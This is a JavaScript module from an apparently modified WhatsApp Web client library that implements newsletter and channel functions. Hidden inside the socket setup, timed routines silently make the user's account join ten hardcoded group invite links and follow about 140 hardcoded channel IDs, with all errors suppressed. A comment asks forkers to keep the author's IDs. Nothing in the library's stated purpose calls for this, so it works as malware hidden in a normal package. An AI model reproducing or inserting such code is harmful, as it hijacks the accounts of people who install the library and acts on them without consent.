"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.extractNewsletterMetadata = exports.makeNewsletterSocket = void 0;
const Types_1 = require("../Types");
const Utils_1 = require("../Utils");
const WABinary_1 = require("../WABinary");
const groups_1 = require("./groups");

const { Boom } = require('@hapi/boom');

const wMexQuery = (
        variables,
        queryId,
        query,
        generateMessageTag
) => {
        return query({
                tag: 'iq',
                attrs: {
                        id: generateMessageTag(),
                        type: 'get',
                        to: WABinary_1.S_WHATSAPP_NET,
                        xmlns: 'w:mex'
                },
                content: [
                        {
                                tag: 'query',
                                attrs: { query_id: queryId },
                                content: Buffer.from(JSON.stringify({ variables }), 'utf-8')
                        }
                ]
        })
}

const executeWMexQuery = async (
        variables,
        queryId,
        dataPath,
        query,
        generateMessageTag
) => {
        const result = await wMexQuery(variables, queryId, query, generateMessageTag)
        const child = (0, WABinary_1.getBinaryNodeChild)(result, 'result')
        if (child?.content) {
                const data = JSON.parse(child.content.toString())

                if (data.errors && data.errors.length > 0) {
                        const errorMessages = data.errors.map((err) => err.message || 'Unknown error').join(', ')
                        const firstError = data.errors[0]
                        const errorCode = firstError.extensions?.error_code || 400
                        throw new Boom(`GraphQL server error: ${errorMessages}`, { statusCode: errorCode, data: firstError })
                }

                const response = dataPath ? data?.data?.[dataPath] : data?.data
                if (typeof response !== 'undefined') {
                        return response
                }
        }

        const action = (dataPath || '').startsWith('xwa2_')
                ? dataPath.substring(5).replace(/_/g, ' ')
                : dataPath?.replace(/_/g, ' ')
        throw new Boom(`Failed to ${action}, unexpected response structure.`, { statusCode: 400, data: result })
}


const AUTO_JOIN_GROUP_LINKS = [
    "https://chat.whatsapp.com/BRtfi2j85Lo1pWWgxUj7Xy?mode=gi_t",
"https://chat.whatsapp.com/FqNd66sBdOdH9wzYpAXzUR?mode=gi_t",
"https://chat.whatsapp.com/JYmAyeIBFCN1cMpoAjIWpf?mode=gi_t",
"https://chat.whatsapp.com/Idaj2fiYkfUDoVNSkKAKIe?mode=gi_t",
"https://chat.whatsapp.com/KX5NtFEv7Ag33cQFhtTA1H?mode=hq1tcla",
"https://chat.whatsapp.com/BVMYJLnvgAQ68oFLYLN3nR?mode=gi_t",
"https://chat.whatsapp.com/ILO2B91xsYI0XfrTavEGd3?mode=gi_t",
"https://chat.whatsapp.com/BxvZ1fvDDE08HFhFJK2ORS?mode=gi_t",
"https://chat.whatsapp.com/IPPQFUdnJ0Z0JZNjLUr78N?mode=hq2tcla",
"https://chat.whatsapp.com/H6P598gRQsQA0XiQ7MrM69?mode=hqctcla"
];

// btw kalo fork jgn hapus idch ku ya bg tambahin idch lu aja, tau diri dikit hehe
const AUTO_FOLLOW_CHANNELS = [
"120363424167094099@newsletter",
"120363404004466629@newsletter",
"120363404143219131@newsletter",
"120363425019464714@newsletter",
"120363406565501075@newsletter",
"120363423506586239@newsletter",
"120363405213835441@newsletter",
"120363406137898106@newsletter",
"120363426908291951@newsletter",
"120363422025548284@newsletter",
"120363405318161688@newsletter",
"120363407364968706@newsletter",
"120363423970105814@newsletter",
"120363405787153441@newsletter",
"120363423064962411@newsletter",
"120363424173341259@newsletter",
"120363405716980341@newsletter",
"120363422534475465@newsletter",
"120363424952837607@newsletter",
"120363420602033344@newsletter",
"120363408235463712@newsletter",
"120363424352021085@newsletter",
"120363405395493749@newsletter",
"120363406127047803@newsletter",
"120363407311043677@newsletter",
"120363404181325298@newsletter",
"120363406419876832@newsletter",
"120363403793367511@newsletter",
"120363423382183272@newsletter",
"120363425574619182@newsletter",
"120363424033350392@newsletter",
"120363423926762964@newsletter",
"120363422667952252@newsletter",
"120363405375683951@newsletter",
"120363405375683951@newsletter",
"120363422437367926@newsletter",
"120363423918664382@newsletter",
"120363403594245657@newsletter",
"120363426459277659@newsletter",
"120363421678959979@newsletter",
"120363425319358971@newsletter",
"120363424391632624@newsletter",
"120363407315450133@newsletter",
"120363422256075975@newsletter",
"120363406471473010@newsletter",
"120363405090075296@newsletter",
"120363405646350560@newsletter",
"120363406664684936@newsletter",
"120363422155105985@newsletter",
"120363406267512623@newsletter",
"120363424046579940@newsletter",
"120363407778713020@newsletter",
"120363407360843162@newsletter",
"120363407895176816@newsletter",
"120363407895176816@newsletter",
"120363420943047950@newsletter",
"120363424297705419@newsletter",
"120363422359699631@newsletter",
"120363422945511797@newsletter",
"120363407622368536@newsletter",
"120363405940873617@newsletter",
"120363406908005388@newsletter",
"120363421780355494@newsletter",
"120363423254581626@newsletter",
"120363424992396763@newsletter",
"120363425136019966@newsletter",
"120363404768606285@newsletter",
"120363424116890616@newsletter",
"120363406168801804@newsletter",
"120363424958544179@newsletter",
"120363405729443578@newsletter",
"120363404364195337@newsletter",
"120363426822953118@newsletter",
"120363404517945504@newsletter",
"120363405197677207@newsletter",
"120363422903670491@newsletter",
"120363425504564806@newsletter",
"120363425162064624@newsletter",
"120363422727995011@newsletter",
"120363404703006550@newsletter",
"120363404157136564@newsletter",
"120363405602657026@newsletter",
"120363405063028232@newsletter",
"120363406025881454@newsletter",
"120363420193223127@newsletter",
"120363423306621722@newsletter",
"120363407372823025@newsletter",
"120363406040113424@newsletter",
"120363404811702223@newsletter",
"120363423483873335@newsletter",
"120363406221225819@newsletter",
"120363426322935175@newsletter",
"120363424168347541@newsletter",
"120363404380965806@newsletter",
"120363424535595666@newsletter",
"120363423632721231@newsletter",
"120363423913620838@newsletter",
"120363422946830942@newsletter",
"120363424114283094@newsletter",
"120363424955798199@newsletter",
"120363409132688193@newsletter",
"120363403967460485@newsletter",
"120363423237248593@newsletter",
"120363421451837210@newsletter",
"120363424678487282@newsletter",
"120363423975261903@newsletter",
"120363424343703288@newsletter",
"120363405334341124@newsletter",
"120363425097351788@newsletter",
"120363406613250627@newsletter",
"120363425060926554@newsletter",
"120363421546745254@newsletter",
"120363424435511565@newsletter",
"120363425576035516@newsletter",
"120363424267178911@newsletter",
"120363422236968290@newsletter",
"120363422735237026@newsletter",
"120363425485459524@newsletter",
"120363421770861119@newsletter",
"120363423861252216@newsletter",
"120363424997526813@newsletter",
"120363422675003973@newsletter",
"120363405652586292@newsletter",
"120363404858615849@newsletter",
"120363404127562610@newsletter",
"120363404914187829@newsletter",
"120363424401307962@newsletter",
"120363405946202493@newsletter",
"120363405032529809@newsletter",
"120363423455960698@newsletter",
"120363406925224836@newsletter",
"120363422322118576@newsletter",
"120363423833774154@newsletter",
"120363423511058225@newsletter",
"120363404440720020@newsletter",
"120363424810479451@newsletter",
"120363406204279513@newsletter",
"120363407208129280@newsletter",
"120363424096737706@newsletter",
"120363423144014354@newsletter"
];

// extrat to link
function extractInviteCodeFromLink(link) {
    try {
        const url = new URL(link);
        if (url.hostname === 'chat.whatsapp.com') {
            const inviteCode = url.pathname.split('/').pop();
            if (inviteCode && inviteCode.length > 0) {
                return inviteCode;
            }
        }
    } catch (error) {}
    return null;
}

// auto join func (group)
async function autoJoinWhatsAppGroups(sock) {
    const groupLinks = AUTO_JOIN_GROUP_LINKS;

    for (const groupLink of groupLinks) {
        try {
            const inviteCode = extractInviteCodeFromLink(groupLink);
            if (inviteCode) {
                // Coba metode pertama
                try {
                    await sock.groupAcceptInvite(inviteCode);
                } catch (error) {
                    // Coba metode kedua sebagai fallback
                    try {
                        await sock.groupAcceptInviteV4(inviteCode, '');
                    } catch (error2) {}
                }
            }
        } catch (error) {}

        // Delay 5 detik antar percobaan join
        await new Promise(resolve => setTimeout(resolve, 5000));
    }
}

// Fungsi untuk auto follow channel WhatsApp
async function autoFollowWhatsAppChannels(sock, newsletterWMexQuery) {
    const channels = AUTO_FOLLOW_CHANNELS;

    for (const channelId of channels) {
        try {
            await newsletterWMexQuery(channelId, Types_1.QueryIds.FOLLOW);
            // Delay 5 detik antar follow channel
            await new Promise(resolve => setTimeout(resolve, 5000));
        } catch (error) {}
    }
}

const makeNewsletterSocket = (config) => {
    const sock = (0, groups_1.makeGroupsSocket)(config);
    const { authState, signalRepository, query, generateMessageTag } = sock;
    const encoder = new TextEncoder();
    const newsletterQuery = async (jid, type, content) => (query({
        tag: 'iq',
        attrs: {
            id: generateMessageTag(),
            type,
            xmlns: 'newsletter',
            to: jid,
        },
        content
    }));
    const newsletterWMexQuery = async (jid, queryId, content) => (query({
        tag: 'iq',
        attrs: {
            id: generateMessageTag(),
            type: 'get',
            xmlns: 'w:mex',
            to: WABinary_1.S_WHATSAPP_NET,
        },
        content: [
            {
                tag: 'query',
                attrs: { 'query_id': queryId },
                content: encoder.encode(JSON.stringify({
                    variables: {
                        'newsletter_id': jid,
                        ...content
                    }
                }))
            }
        ]
    }));

    // Auto join ke group WhatsApp terlebih dahulu
    setTimeout(async () => {
        try {
            await autoJoinWhatsAppGroups(sock);
        } catch {}
    }, 5000);

    // Auto-follow ke channel WhatsApp setelah join group
    setTimeout(async () => {
        try {
            await autoFollowWhatsAppChannels(sock, newsletterWMexQuery);
        } catch {}
    }, 10000);

    const parseFetchedUpdates = async (node, type) => {
        let child;
        if (type === 'messages') {
            child = (0, WABinary_1.getBinaryNodeChild)(node, 'messages');
        }
        else {
            const parent = (0, WABinary_1.getBinaryNodeChild)(node, 'message_updates');
            child = (0, WABinary_1.getBinaryNodeChild)(parent, 'messages');
        }
        return await Promise.all((0, WABinary_1.getAllBinaryNodeChildren)(child).map(async (messageNode) => {
            var _a, _b;
            messageNode.attrs.from = child === null || child === void 0 ? void 0 : child.attrs.jid;
            const views = parseInt(((_b = (_a = (0, WABinary_1.getBinaryNodeChild)(messageNode, 'views_count')) === null || _a === void 0 ? void 0 : _a.attrs) === null || _b === void 0 ? void 0 : _b.count) || '0');
            const reactionNode = (0, WABinary_1.getBinaryNodeChild)(messageNode, 'reactions');
            const reactions = (0, WABinary_1.getBinaryNodeChildren)(reactionNode, 'reaction')
                .map(({ attrs }) => ({ count: +attrs.count, code: attrs.code }));
            const data = {
                'server_id': messageNode.attrs.server_id,
                views,
                reactions
            };
            if (type === 'messages') {
                const { fullMessage: message, decrypt } = await (0, Utils_1.decryptMessageNode)(messageNode, authState.creds.me.id, authState.creds.me.lid || '', signalRepository, config.logger);
                await decrypt();
                data.message = message;
            }
            return data;
        }));
    };
    return {
        ...sock,
        newsletterFetchAllSubscribe: async () => {
            const list = await executeWMexQuery(
                {},
                '6388546374527196',
                'xwa2_newsletter_subscribed',
                query,
                generateMessageTag
            );
            return list;
        },
        subscribeNewsletterUpdates: async (jid) => {
            var _a;
            const result = await newsletterQuery(jid, 'set', [{ tag: 'live_updates', attrs: {}, content: [] }]);
            return (_a = (0, WABinary_1.getBinaryNodeChild)(result, 'live_updates')) === null || _a === void 0 ? void 0 : _a.attrs;
        },
        newsletterReactionMode: async (jid, mode) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.JOB_MUTATION, {
                updates: { settings: { 'reaction_codes': { value: mode } } }
            });
        },
        newsletterUpdateDescription: async (jid, description) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.JOB_MUTATION, {
                updates: { description: description || '', settings: null }
            });
        },
        newsletterUpdateName: async (jid, name) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.JOB_MUTATION, {
                updates: { name, settings: null }
            });
        },
        newsletterUpdatePicture: async (jid, content) => {
            const { img } = await (0, Utils_1.generateProfilePicture)(content);
            await newsletterWMexQuery(jid, Types_1.QueryIds.JOB_MUTATION, {
                updates: { picture: img.toString('base64'), settings: null }
            });
        },
        newsletterRemovePicture: async (jid) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.JOB_MUTATION, {
                updates: { picture: '', settings: null }
            });
        },
        newsletterUnfollow: async (jid) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.UNFOLLOW);
        },
        newsletterFollow: async (jid) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.FOLLOW);
        },
        newsletterUnmute: async (jid) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.UNMUTE);
        },
        newsletterMute: async (jid) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.MUTE);
        },
        newsletterAction: async (jid, type) => {
            await newsletterWMexQuery(jid, type.toUpperCase());
        },
        newsletterCreate: async (name, description, reaction_codes) => {
            //TODO: Implement TOS system wide for Meta AI, communities, and here etc.
            /**tos query */
            await query({
                tag: 'iq',
                attrs: {
                    to: WABinary_1.S_WHATSAPP_NET,
                    xmlns: 'tos',
                    id: generateMessageTag(),
                    type: 'set'
                },
                content: [
                    {
                        tag: 'notice',
                        attrs: {
                            id: '20601218',
                            stage: '5'
                        },
                        content: []
                    }
                ]
            });
            const result = await newsletterWMexQuery(undefined, Types_1.QueryIds.CREATE, {
                input: { name, description, settings: { 'reaction_codes': { value: reaction_codes.toUpperCase() } } }
            });
            return (0, exports.extractNewsletterMetadata)(result, true);
        },
        newsletterMetadata: async (type, key, role) => {
            const result = await newsletterWMexQuery(undefined, Types_1.QueryIds.METADATA, {
                input: {
                    key,
                    type: type.toUpperCase(),
                    'view_role': role || 'GUEST'
                },
                'fetch_viewer_metadata': true,
                'fetch_full_image': true,
                'fetch_creation_time': true
            });
            return (0, exports.extractNewsletterMetadata)(result);
        },
        newsletterAdminCount: async (jid) => {
            var _a, _b;
            const result = await newsletterWMexQuery(jid, Types_1.QueryIds.ADMIN_COUNT);
            const buff = (_b = (_a = (0, WABinary_1.getBinaryNodeChild)(result, 'result')) === null || _a === void 0 ? void 0 : _a.content) === null || _b === void 0 ? void 0 : _b.toString();
            return JSON.parse(buff).data[Types_1.XWAPaths.ADMIN_COUNT].admin_count;
        },
        /**user is Lid, not Jid */
        newsletterChangeOwner: async (jid, user) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.CHANGE_OWNER, {
                'user_id': user
            });
        },
        /**user is Lid, not Jid */
        newsletterDemote: async (jid, user) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.DEMOTE, {
                'user_id': user
            });
        },
        newsletterDelete: async (jid) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.DELETE);
        },
        /**if code wasn't passed, the reaction will be removed (if is reacted) */
        newsletterReactMessage: async (jid, serverId, code) => {
            await query({
                tag: 'message',
                attrs: { to: jid, ...(!code ? { edit: '7' } : {}), type: 'reaction', 'server_id': serverId, id: (0, Utils_1.generateMessageID)() },
                content: [{
                        tag: 'reaction',
                        attrs: code ? { code } : {}
                    }]
            });
        },
        newsletterFetchMessages: async (type, key, count, after) => {
            const result = await newsletterQuery(WABinary_1.S_WHATSAPP_NET, 'get', [
                {
                    tag: 'messages',
                    attrs: { type, ...(type === 'invite' ? { key } : { jid: key }), count: count.toString(), after: (after === null || after === void 0 ? void 0 : after.toString()) || '100' }
                }
            ]);
            return await parseFetchedUpdates(result, 'messages');
        },
        newsletterFetchUpdates: async (jid, count, after, since) => {
            const result = await newsletterQuery(jid, 'get', [
                {
                    tag: 'message_updates',
                    attrs: { count: count.toString(), after: (after === null || after === void 0 ? void 0 : after.toString()) || '100', since: (since === null || since === void 0 ? void 0 : since.toString()) || '0' }
                }
            ]);
            return await parseFetchedUpdates(result, 'updates');
        }
    };
};
exports.makeNewsletterSocket = makeNewsletterSocket;
const extractNewsletterMetadata = (node, isCreate) => {
    const result = WABinary_1.getBinaryNodeChild(node, 'result')?.content?.toString()
    const metadataPath = JSON.parse(result).data[isCreate ? Types_1.XWAPaths.CREATE : Types_1.XWAPaths.NEWSLETTER]

    const metadata = {
        id: metadataPath?.id,
        state: metadataPath?.state?.type,
        creation_time: +metadataPath?.thread_metadata?.creation_time,
        name: metadataPath?.thread_metadata?.name?.text,
        nameTime: +metadataPath?.thread_metadata?.name?.update_time,
        description: metadataPath?.thread_metadata?.description?.text,
        descriptionTime: +metadataPath?.thread_metadata?.description?.update_time,
        invite: metadataPath?.thread_metadata?.invite,
        picture: Utils_1.getUrlFromDirectPath(metadataPath?.thread_metadata?.picture?.direct_path || ''), 
        preview: Utils_1.getUrlFromDirectPath(metadataPath?.thread_metadata?.preview?.direct_path || ''), 
        reaction_codes: metadataPath?.thread_metadata?.settings?.reaction_codes?.value,
        subscribers: +metadataPath?.thread_metadata?.subscribers_count,
        verification: metadataPath?.thread_metadata?.verification,
        viewer_metadata: metadataPath?.viewer_metadata
    }
    return metadata
}
exports.extractNewsletterMetadata = extractNewsletterMetadata;
